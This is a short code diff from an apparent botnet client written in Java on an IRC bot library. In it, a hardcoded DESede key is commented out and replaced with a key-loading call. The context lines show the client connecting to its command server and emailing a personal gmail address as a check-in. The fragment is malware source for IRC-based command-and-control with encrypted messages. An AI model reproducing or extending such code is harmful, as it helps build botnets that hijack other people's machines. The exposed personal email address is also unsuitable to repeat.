@@ -30,12 +30,12 @@ public class BotnetClient extends PircBot {
 	private String id;
 	private String operator;
 	
-	private static final byte[] key = 
+	/*private static final byte[] key = 
 	{(byte)0x2e, (byte)0xa0, (byte)0x8c, (byte)0x66, (byte)0xf6, (byte)0x8d, (byte)0x71, 
 	(byte)0xae, (byte)0x83, (byte)0xa1, (byte)0x24, (byte)0x96, (byte)0xa3, (byte)0xc3, 
 	(byte)0xd0, (byte)0x91, (byte)0x7f, (byte)0x86, (byte)0x69, (byte)0x78, (byte)0x99, 
 	(byte)0xee, (byte)0x80, (byte)032, (byte)0x9d, (byte)0xb8, (byte)0xb1, (byte)0x47, 
-	(byte)0x65, (byte)0xa1, (byte)0xd0, (byte)0x01};
+	(byte)0x65, (byte)0xa1, (byte)0xd0, (byte)0x01};*/
 
 	private Key startKey;
 	//private Cipher startCipher;
@@ -58,7 +58,8 @@ public class BotnetClient extends PircBot {
 			connect(SERVER, PORT);
 			sendEmail("shakalandro@gmail.com", new String[] {"shakalandro@gmail.com"}, "works", "sweetness");
 			
-			startKey = new SecretKeySpec(key, "DESede");
+			startKey = MsgEncrypt.getStartKey();
+			//startKey = new SecretKeySpec(key, "DESede");
 			//startCipher = Cipher.getInstance("AES");
 			//startCipher.init(Cipher.DECRYPT_MODE, startKey);
 			startMsgE = MsgEncrypt.getInstance(startKey);
